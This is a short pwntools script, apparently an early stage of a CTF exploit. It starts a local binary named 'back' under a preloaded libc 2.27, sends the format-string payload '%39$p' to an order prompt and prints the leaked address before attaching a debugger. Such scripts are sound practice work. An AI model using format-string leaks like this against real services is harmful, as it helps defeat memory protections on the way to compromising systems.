from pwn import *

io = process("./back",env={"LD_PRELOAD":"./libc-2.27.so"})

io.sendlineafter("> ","2")
io.sendlineafter("What would you like to order? ","%39$p")

io.recvuntil("you ordered: ")
leak = io.recv(14)
print leak

gdb.attach(io)
io.interactive()
